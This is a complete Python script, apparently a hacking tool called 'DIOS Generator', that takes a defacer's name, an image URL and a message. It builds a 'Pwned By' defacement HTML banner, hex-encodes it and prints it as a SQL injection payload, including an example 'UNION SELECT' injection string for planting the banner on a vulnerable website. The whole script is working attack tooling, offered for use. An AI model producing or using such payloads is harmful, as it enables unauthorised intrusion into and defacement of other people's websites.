import binascii

def to_hex(s):
    return '0x' + binascii.hexlify(s.encode()).decode()

def generate_dios(defacer, image_url, message):
    html = f'''
<center>
  <img src="{image_url}" ><br>
  <font color="crimson">
    <h1>Pwned By <span style="color:red;">{defacer}</span></h1>
    <br><h3>Security Is Just An Illusion</h3><br>
    <marquee behavior="scroll" direction="left" scrollamount="10" style="color:red"> {message}
    </marquee>
  </font>
</center>
'''
    hex_payload = to_hex(html)
    print("\n Your DIOS Payload (CONCAT SQL):\n")
    print(f"CONCAT({hex_payload})")
    print("\n Use it inside your UNION SELECT payload (example):")
    print(f"... UNION SELECT 1,2,3,{hex_payload},5,6--+")

print("██████╗ ██╗ ██████╗ ███████╗")
print("██╔══██╗██║██╔════╝ ██╔════╝")
print("██████╔╝██║██║  ███╗█████╗  ")
print("██╔═══╝ ██║██║   ██║██╔══╝  ")
print("██║     ██║╚██████╔╝███████╗")
print("╚═╝     ╚═╝ ╚═════╝ ╚══════╝")
print("")
print(" DIOS Generator \n")
print("Created By TheKnife")
defacer = input("Enter defacer name: ")
img = input("Enter image URL: ")
msg = input("Enter flex message: ")

generate_dios(defacer, img, msg)
